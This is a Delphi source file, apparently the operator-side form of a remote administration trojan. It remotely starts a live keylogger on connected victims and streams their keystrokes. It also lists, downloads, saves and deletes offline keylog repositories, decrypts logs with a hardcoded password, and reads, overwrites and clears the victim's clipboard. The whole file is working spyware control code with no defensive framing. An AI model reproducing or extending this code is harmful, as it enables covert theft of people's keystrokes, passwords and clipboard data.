unit UnitKeyboardInputs;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitConnection, IniFiles, Menus, StdCtrls, ComCtrls, ExtCtrls,
  IdTCPServer, ImgList, UnitMain;

type
  TFormKeyboardInputs = class(TForm)
    pgc1: TPageControl;
    stat1: TStatusBar;
    ts2: TTabSheet;
    ts3: TTabSheet;
    tv1: TTreeView;
    spl1: TSplitter;
    redt2: TRichEdit;
    redt3: TRichEdit;
    pm2: TPopupMenu;
    R1: TMenuItem;
    N2: TMenuItem;
    D1: TMenuItem;
    pm3: TPopupMenu;
    N4: TMenuItem;
    S4: TMenuItem;
    C1: TMenuItem;
    S5: TMenuItem;
    D3: TMenuItem;
    R2: TMenuItem;
    ts1: TTabSheet;
    redt1: TRichEdit;
    pm1: TPopupMenu;
    S1: TMenuItem;
    S2: TMenuItem;
    S3: TMenuItem;
    il1: TImageList;
    O1: TMenuItem;
    dlgOpen1: TOpenDialog;
    dlgSave1: TSaveDialog;
    procedure tv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure S1Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure O1Click(Sender: TObject);
    procedure D3Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure S4Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure S5Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
    procedure UpdateStatus(Status: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
    procedure OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
  end;

var
  FormKeyboardInputs: TFormKeyboardInputs;

implementation

uses
  UnitConstants, UnitRepository, UnitFunctions, UnitStringEncryption,
  UnitStringCompression;

{$R *.dfm}
        
constructor TFormKeyboardInputs.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormKeyboardInputs.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;
          
function GetNodeRoot(Node: TTreeNode): string;
begin
  repeat
    Result := Node.Text + Result;
    Node := Node.Parent;
  until not Assigned(Node)
end;

procedure TFormKeyboardInputs.OnRead(AThread: TIdPeerThread; ReceivedDatas: string);
var
  MainCommand: string;
  TmpStr, TmpStr1, TmpStr2: string;
  i: Integer;
  TmpNode: TTreeNode;
  Stream: TMemoryStream;    
  FindData: TWin32FindData;
begin
  MainCommand := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
  Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

  if MainCommand = KEYLOGGERLIVESTART then
  begin
    S1.Enabled := False;
    S2.Enabled := True;
    UpdateStatus('Live keylogger started!');
  end
  else
        
  if MainCommand = KEYLOGGERLIVESTOP then
  begin
    S2.Enabled := False;
    S1.Enabled := True;
    UpdateStatus('Live keylogger stopped!');
  end
  else

  if MainCommand = KEYLOGGERLIVETEXT then
  begin
    redt1.Text := redt1.Text + ReceivedDatas;
    redt1.SelStart := Length(redt1.Text);
    SendMessage(redt1.Handle, EM_SCROLLCARET, 0, 0);
  end
  else

  if MainCommand = KEYLOGGERGETREPO then
  begin
    tv1.Items.Clear;
    tv1.Items.BeginUpdate;

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    while Stream.Position < Stream.Size do
    begin
      Stream.ReadBuffer(FindData, SizeOf(TWin32FindData));
      if string(FindData.cFileName) = '.' then Continue; 
      if FindData.cFileName = '..' then Continue;

      TmpNode := tv1.Items.Add(nil, FindData.cFileName);
      TmpNode.ImageIndex := 0;
      TmpNode.SelectedIndex := 0;
    end;

    tv1.Items.EndUpdate;
    UpdateStatus('Remote keylogger repository listed: ' + IntToStr(tv1.Items.Count));
  end
  else

  if MainCommand = KEYLOGGERGETLOGS then
  begin
    tv1.Items.BeginUpdate;

    Stream := TMemoryStream.Create;
    StrToStream(ReceivedDatas, Stream);
    Stream.Position := 0;

    while Stream.Position < Stream.Size do
    begin
      Stream.ReadBuffer(FindData, SizeOf(TWin32FindData));
      TmpNode := tv1.Items.Add(tv1.Selected, FindData.cFileName);
      TmpNode.ImageIndex := 1;
      TmpNode.SelectedIndex := 1;
    end;

    tv1.Items.EndUpdate;
    UpdateStatus('Remote keylogger logs listed: ' + IntToStr(TmpNode.Count));
  end
  else

  if MainCommand = KEYLOGGERREADLOG then
  begin
    TmpStr1 := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    for i := 0 to tv1.Items.Count - 1 do
    if tv1.Items.Item[i].Text = TmpStr1 then
    begin
      TmpStr2 := GetNodeRoot(tv1.Items.Item[i]);
      Break;
    end;

    TmpStr := GetKeyloggerFolder(Client.Identification);
    TmpStr := TmpStr + '\Offline keylogger\' + TmpStr2;
    if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
    TmpStr := TmpStr + '\' + TmpStr1;
    CreateTextFile(TmpStr, ReceivedDatas);
    redt2.Text := ReceivedDatas;
  end
  else

  if MainCommand = KEYLOGGERDELLOG then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    tv1.Items.BeginUpdate;
    for i := 0 to tv1.Items.Count-1 do
    begin
      if (tv1.Items.Item[i].Text = TmpStr) and (ReceivedDatas = 'Y') then
      begin
        tv1.Items.Item[i].Delete;
        Break;
      end;
    end;
    tv1.Items.EndUpdate;

    if ReceivedDatas = 'N' then UpdateStatus('Failed to delete remote keylog "' + TmpStr + '".') else
      UpdateStatus('Remote keylog "' + TmpStr + '" deleted!');
  end
  else

  if MainCommand = KEYLOGGERDELREPO then
  begin
    TmpStr := Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1);
    Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));

    tv1.Items.BeginUpdate;
    for i := 0 to tv1.Items.Count-1 do
    begin
      if (tv1.Items.Item[i].Text = TmpStr) and (ReceivedDatas = 'Y') then
      begin
        tv1.Items.Item[i].Delete;
        Break;
      end;
    end;
    tv1.Items.EndUpdate;

    if ReceivedDatas = 'N' then UpdateStatus('Failed to delete remote repository "' + TmpStr + '".') else
      UpdateStatus('Remote repository "' + TmpStr + '" deleted!');
  end
  else
  
  if MainCommand = CLIPBOARDTEXT then
  begin
    redt3.Clear;
    redt3.Lines.Add('[Clipboard text]');
    redt3.Text := redt3.Text + ReceivedDatas;
  end
  else

  if MainCommand = CLIPBOARDFILES then
  begin
    redt3.Clear;
    redt3.Lines.Add('[Clipboard file(s)]');

    while ReceivedDatas <> '' do
    begin
      redt3.Lines.Add(Copy(ReceivedDatas, 1, Pos('|', ReceivedDatas)-1));
      Delete(ReceivedDatas, 1, Pos('|', ReceivedDatas));
    end;
  end;
end;

procedure TFormKeyboardInputs.UpdateStatus(Status: string);
begin
  stat1.Panels.Items[0].Text := Status;
end;

procedure TFormKeyboardInputs.tv1ContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(tv1.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[0].Enabled := True;
    pm2.Items[1].Enabled := True;
  end
  else for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;
end;

procedure TFormKeyboardInputs.S1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, KEYLOGGERLIVESTART + '|');
  UpdateStatus('Requesting live keylogger process, please wait...');
end;

procedure TFormKeyboardInputs.S2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, KEYLOGGERLIVESTOP + '|');
  UpdateStatus('Stopping live keylogger process, please wait...');
end;

procedure TFormKeyboardInputs.S3Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetKeyloggerFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'Keylog_' + MyGetTime('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, redt1.Text);
end;

procedure TFormKeyboardInputs.R1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, KEYLOGGERGETREPO + '|');
  UpdateStatus('Requesting remote keylogger repository, please wait...');
end;

procedure TFormKeyboardInputs.O1Click(Sender: TObject);   
var
  TmpStr: string;
begin
  TmpStr := GetKeyloggerFolder(Client.Identification);
  TmpStr := TmpStr + '\Offline keylogger';
  dlgOpen1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgOpen1.InitialDir := TmpStr;
  dlgOpen1.Filter := '(*.txt)|*.txt';
  dlgOpen1.DefaultExt := 'txt';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  TmpStr := LoadTextFile(dlgSave1.FileName);
  TmpStr := EnDecryptString(TmpStr, PROGRAMPASSWORD);
  redt2.Text := TmpStr;
end;

procedure TFormKeyboardInputs.D3Click(Sender: TObject);
begin
  if tv1.Selected.ImageIndex = 0 then
    SendDatas(Client.AThread, KEYLOGGERGETLOGS + '|' + tv1.Selected.Text)
  else SendDatas(Client.AThread, KEYLOGGERREADLOG + '|' + tv1.Selected.Text);
end;

procedure TFormKeyboardInputs.D1Click(Sender: TObject);
begin
  if tv1.Selected.ImageIndex = 0 then
    SendDatas(Client.AThread, KEYLOGGERDELREPO + '|' + tv1.Selected.Text)
  else SendDatas(Client.AThread, KEYLOGGERDELLOG + '|' + tv1.Selected.Text);
end;

procedure TFormKeyboardInputs.R2Click(Sender: TObject);
begin
  SendDatas(Client.AThread, CLIPBOARDTEXT + '|');
end;

procedure TFormKeyboardInputs.S4Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := InputBox(PROGRAMNAME + ' ' + PROGRAMVERSION, 'Clipboard text', '');
  SendDatas(Client.AThread, CLIPBOARDSETTEXT + '|' + TmpStr);
end;

procedure TFormKeyboardInputs.C1Click(Sender: TObject);
begin
  SendDatas(Client.AThread, CLIPBOARDCLEAR + '|');
  redt3.Clear;
end;

procedure TFormKeyboardInputs.S5Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetKeyloggerFolder(Client.Identification);
  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := TmpStr;
  dlgSave1.FileName := 'Clipboard_' + MyGetTime('') + '.txt';
  dlgSave1.Filter := '(*.txt)|*.txt';
  dlgSave1.DefaultExt := 'txt';
  if (not dlgSave1.Execute) and (not FileExists(dlgSave1.FileName)) then Exit;
  CreateTextFile(dlgSave1.FileName, redt3.Text);
end;

procedure TFormKeyboardInputs.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  if S2.Enabled then S2.Click;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Keyboard Inputs', 'Left', Left);
  IniFile.WriteInteger('Keyboard Inputs', 'Top', Top);  
  IniFile.WriteInteger('Keyboard Inputs', 'Width', Width);
  IniFile.WriteInteger('Keyboard Inputs', 'Height', Height);
  IniFile.Free;
end;

procedure TFormKeyboardInputs.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Keyboard Inputs', 'Left', 207);
  Top := IniFile.ReadInteger('Keyboard Inputs', 'Top', 116);
  Width := IniFile.ReadInteger('Keyboard Inputs', 'Width', 696);
  Height := IniFile.ReadInteger('Keyboard Inputs', 'Height', 360);
  IniFile.Free;
end;

procedure TFormKeyboardInputs.FormShow(Sender: TObject);
begin
  if AutostartKeylogger then S1.Click;
end;

end.
